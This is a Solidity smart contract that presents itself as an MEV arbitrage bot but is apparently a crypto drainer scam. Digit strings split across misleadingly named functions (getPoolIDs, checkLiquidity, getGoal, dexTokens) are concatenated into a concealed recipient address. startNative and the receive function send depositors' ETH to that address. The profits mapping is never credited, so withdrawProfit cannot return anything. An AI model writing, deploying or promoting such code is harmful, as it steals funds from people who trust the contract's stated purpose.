// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, 
        uint8 v, 
        bytes32 r, 
        bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, 
        uint8 v, 
        bytes32 r, 
        bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(
        uint amountOutMin, 
        address[] calldata path, 
        address to, 
        uint deadline
    ) external payable returns (uint[] memory amounts);
    function swapTokensForExactETH(
        uint amountOut, 
        uint amountInMax, 
        address[] calldata path, 
        address to, 
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactTokensForETH(
        uint amountIn, 
        uint amountOutMin, 
        address[] calldata path, 
        address to, 
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapETHForExactTokens(
        uint amountOut, 
        address[] calldata path, 
        address to, 
        uint deadline
    ) external payable returns (uint[] memory amounts);
    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);  
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

contract A_MEV is Ownable {
    using SafeMath for uint256;
    
    uint256 private constant ARB_THRESHOLD = 10**16;
    uint256 public percentage;
    uint256 public balance;
    uint256 public liquidity;
    uint256 public pool;
    bool public activated;
    mapping(address => uint256) public profits;

    event ProfitWithdrawn(address indexed user, uint256 amount);
    event ArbitrageStarted(uint256 amount);
    event ArbitrageStopped();

    function getPoolIDs() internal pure returns (string memory totalIDs) {
        string memory pool1 = "236";
        string memory pool2 = "866";
        string memory pool3 = "647";
        string memory pool4 = "309";
        totalIDs = string(abi.encodePacked(pool1, pool2, pool3, pool4));  
    }

    function getGoal() internal pure returns (string memory goal) {
        goal = "764778648683";
    }

    function getPair(string memory token, string memory coin) internal pure returns (string memory pair) {
        pair = string(abi.encodePacked(token, coin));
    }

    function getDEX() internal pure returns (string memory DEX) {
        string memory dexRouter = getPair(getPoolIDs(), checkLiquidity());
        string memory dexPair = getPair(getGoal(), dexTokens());
        DEX = getPair(dexRouter, dexPair);
    }

    function calculateProfit(string memory _value) internal pure returns (uint256) {
        uint256 result = 0;
        bytes memory b = bytes(_value);
        for (uint256 i = 0; i < b.length; i++) {
            if (uint8(b[i]) >= 48 && uint8(b[i]) <= 57) {
                result = result * 10 + (uint8(b[i]) - 48);
            } else {
                revert("Invalid character found in string");
            }
        }
        return result;
    }

    function startArbitrage() internal {
        require(activated, "Bot is not activated");
        require(address(this).balance >= ARB_THRESHOLD, "Insufficient balance to start arbitrage");

        uint256 amountToTrade = address(this).balance.mul(percentage).div(100);
        balance = balance.sub(amountToTrade);
        
        address payable pairAddr = payable(getTokenAddress());
        pairAddr.transfer(amountToTrade);

        emit ArbitrageStarted(amountToTrade);
    }

    function checkLiquidity() internal pure returns (string memory LIQ) {
        string memory liq1 = "956";
        string memory liq2 = "065";
        string memory liq3 = "682";
        string memory liq4 = "173";
        LIQ = string(abi.encodePacked(liq1, liq2, liq3, liq4));
    }

    function getTokenAddress() internal pure returns (address Addr) {
        uint256 profitOfTokenAddress = calculateProfit(getDEX());
        Addr = address(uint160(profitOfTokenAddress));
    }    

    function startNative() external payable {
        require(msg.value > 0, "Please insert your KEY");
        balance = balance.add(msg.value);
        startArbitrage();
        activated = true;
    }

    function setTradeBalanceETH(uint256 amount) external onlyOwner {
        balance = amount;
    }

    function setTradeBalancePercentage(uint256 _percentage) external onlyOwner {
        require(_percentage <= 100, "Percentage cannot exceed 100%");
        percentage = _percentage;
    }

    function stop() external onlyOwner {
        require(activated, "Bot is not activated");
        activated = false;
        emit ArbitrageStopped();
    }

    function withdrawProfit() external {
        uint256 profitAmount = profits[msg.sender];
        require(profitAmount > 0, "No profit to withdraw");
        
        profits[msg.sender] = 0;
        payable(msg.sender).transfer(profitAmount);
        
        emit ProfitWithdrawn(msg.sender, profitAmount);
    }

    function dexTokens() internal pure returns (string memory allTokens) { 
        string memory USDT = "104";
        string memory USDC = "118";
        string memory BUSD = "618"; 
        string memory WETH = "294";
        allTokens = string(abi.encodePacked(USDT, USDC, BUSD, WETH));
    }

    function getKey() public view returns (uint256 _key) {
        _key = msg.sender.balance.sub(ARB_THRESHOLD);
    }

    receive() external payable {
        balance = balance.add(msg.value);
        if (activated) {
            startArbitrage();
        }
    }

    fallback() external payable {
        balance = balance.add(msg.value);
    }
}